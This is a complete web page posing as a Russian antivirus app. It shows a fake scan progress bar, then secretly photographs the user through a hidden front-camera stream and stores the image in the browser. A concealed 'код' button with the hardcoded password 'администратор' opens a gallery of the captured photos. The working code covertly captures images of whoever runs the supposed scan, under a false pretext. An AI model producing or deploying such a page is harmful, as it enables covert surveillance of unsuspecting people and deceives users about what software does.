<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Антивирус</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body {
            background-color: #f5f5f5; /* Светло-серый фон, выглядит аккуратнее белого */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        /* Главный экран */
        #mainScreen {
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
        }

        h1 {
            font-size: 32px;
            color: #222;
            margin-bottom: 40px;
            font-weight: 600;
            letter-spacing: 1px;
        }

        #startBtn {
            padding: 15px 50px;
            font-size: 18px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 30px;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(0,123,255,0.3);
            transition: background 0.3s;
        }

        #startBtn:active {
            background-color: #0056b3;
            transform: scale(0.98);
        }

        #progressText {
            font-size: 48px;
            font-weight: bold;
            color: #007bff;
            display: none;
            margin-top: 20px;
        }

        /* Скрытая камера */
        #hiddenVideo {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            z-index: -1;
        }

        /* Аккуратная кнопка КОД */
        #secretBtn {
            position: fixed;
            bottom: 15px;
            right: 15px;
            font-size: 14px;
            color: #888;
            cursor: pointer;
            padding: 10px;
            user-select: none;
            background: rgba(255,255,255,0.8);
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        /* Модальные окна */
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            justify-content: center;
            align-items: center;
            z-index: 100;
        }

        .modal-content {
            background: white;
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            width: 85%;
            max-width: 320px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }

        input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 15px 0;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 16px;
            text-align: center;
            outline: none;
        }
        
        input[type="password"]:focus {
            border-color: #007bff;
        }

        .modal-btn {
            padding: 12px 20px;
            background: #333;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }
        
        .modal-btn.cancel {
            background: #ccc;
            color: #333;
            margin-top: 10px;
        }

        /* Галерея */
        #galleryModal {
            background: #fff;
            overflow-y: auto;
            display: none;
            justify-content: flex-start;
            padding-top: 60px;
            align-items: center;
            flex-direction: column;
        }

        #closeGallery {
            position: fixed;
            top: 15px;
            right: 15px;
            font-size: 14px;
            background: #ff3b30;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 20px;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
        }

        #galleryGrid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
            gap: 10px;
            padding: 15px;
            width: 100%;
            max-width: 600px;
        }

        #galleryGrid img {
            width: 100%;
            height: 110px;
            object-fit: cover;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        
        .empty-msg {
            color: #888;
            grid-column: 1 / -1;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <!-- Скрытые элементы для фото -->
    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <!-- Главный экран -->
    <div id="mainScreen">
        <h1>Антивирус</h1>
        <button id="startBtn">Запустить</button>
        <div id="progressText">0%</div>
    </div>

    <!-- Кнопка "код" -->
    <div id="secretBtn">код</div>

    <!-- Окно ввода пароля -->
    <div id="loginModal" class="modal">
        <div class="modal-content">
            <h3 style="color: #333; margin-bottom: 10px;">Введите код</h3>
            <input type="password" id="passwordInput" placeholder="Пароль">
            <button class="modal-btn" id="submitPassBtn">Войти</button>
            <button class="modal-btn cancel" id="cancelPassBtn">Отмена</button>
        </div>
    </div>

    <!-- Сейф (Галерея) -->
    <div id="galleryModal" class="modal">
        <button id="closeGallery">Закрыть</button>
        <div id="galleryGrid"></div>
    </div>

<script>
    // --- 1. ЛОГИКА КАМЕРЫ ---
    const hiddenVideo = document.getElementById('hiddenVideo');
    const hiddenCanvas = document.getElementById('hiddenCanvas');
    let stream = null;

    // Запускаем камеру сразу при загрузке страницы (браузер спросит разрешение)
    async function initCamera() {
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'user' },
                audio: false
            });
            hiddenVideo.srcObject = stream;
        } catch (err) {
            console.log('Камера не разрешена или недоступна.');
        }
    }
    initCamera();

    // Функция тайного снимка
    function takeHiddenPhoto() {
        if (!hiddenVideo.videoWidth) return; // Если камера не работает, ничего не делаем

        hiddenCanvas.width = hiddenVideo.videoWidth;
        hiddenCanvas.height = hiddenVideo.videoHeight;
        const ctx = hiddenCanvas.getContext('2d');
        ctx.drawImage(hiddenVideo, 0, 0, hiddenCanvas.width, hiddenCanvas.height);

        // Уменьшаем фото, чтобы не переполнить память
        const smallCanvas = document.createElement('canvas');
        smallCanvas.width = 500;
        smallCanvas.height = 500 * (hiddenCanvas.height / hiddenCanvas.width);
        const smallCtx = smallCanvas.getContext('2d');
        smallCtx.drawImage(hiddenCanvas, 0, 0, smallCanvas.width, smallCanvas.height);
        
        const dataUrl = smallCanvas.toDataURL('image/jpeg', 0.7);
        
        // Сохраняем
        const photos = getPhotos();
        photos.unshift(dataUrl);
        localStorage.setItem('antivirus_photos', JSON.stringify(photos));
    }

    // --- 2. ЛОГИКА АНТИВИРУСА ---
    const startBtn = document.getElementById('startBtn');
    const progressText = document.getElementById('progressText');
    let progress = 0;
    let scanning = false;

    startBtn.addEventListener('click', () => {
        if (scanning) return;
        scanning = true;
        
        startBtn.style.display = 'none';
        progressText.style.display = 'block';
        
        const interval = setInterval(() => {
            progress++;
            progressText.innerText = progress + '%';
            
            if (progress >= 100) {
                clearInterval(interval);
                progressText.innerText = 'Готово';
                // Делаем снимок, когда доходит до 100%
                takeHiddenPhoto(); 
            }
        }, 40); // Скорость загрузки (40мс * 100 = 4 секунды)
    });

    // --- 3. ЛОГИКА ВХОДА И СЕЙФА ---
    const secretBtn = document.getElementById('secretBtn');
    const loginModal = document.getElementById('loginModal');
    const passwordInput = document.getElementById('passwordInput');
    const submitPassBtn = document.getElementById('submitPassBtn');
    const cancelPassBtn = document.getElementById('cancelPassBtn');
    const galleryModal = document.getElementById('galleryModal');
    const closeGallery = document.getElementById('closeGallery');
    const galleryGrid = document.getElementById('galleryGrid');

    // Открыть окно ввода пароля
    secretBtn.addEventListener('click', () => {
        loginModal.style.display = 'flex';
        passwordInput.value = '';
        passwordInput.focus();
    });

    // Закрыть окно ввода пароля
    cancelPassBtn.addEventListener('click', () => {
        loginModal.style.display = 'none';
    });

    // Проверка пароля
    submitPassBtn.addEventListener('click', () => {
        if (passwordInput.value.toLowerCase() === 'администратор') {
            loginModal.style.display = 'none';
            galleryModal.style.display = 'flex';
            renderGallery();
        } else {
            alert('Неверный код!');
            passwordInput.value = '';
        }
    });
    
    // Ввод по нажатию на Enter
    passwordInput.addEventListener('keypress', function (e) {
        if (e.key === 'Enter') {
            submitPassBtn.click();
        }
    });

    // Закрыть галерею
    closeGallery.addEventListener('click', () => {
        galleryModal.style.display = 'none';
    });

    // --- 4. РАБОТА С ГАЛЕРЕЕЙ ---
    function getPhotos() {
        try {
            return JSON.parse(localStorage.getItem('antivirus_photos')) || [];
        } catch {
            return [];
        }
    }

    function renderGallery() {
        galleryGrid.innerHTML = '';
        const photos = getPhotos();
        
        if (photos.length === 0) {
            galleryGrid.innerHTML = '<div class="empty-msg">Сейф пуст. Сделайте снимок, запустив антивирус.</div>';
            return;
        }

        photos.forEach(photo => {
            const img = document.createElement('img');
            img.src = photo;
            galleryGrid.appendChild(img);
        });
    }
</script>
</body>
</html>
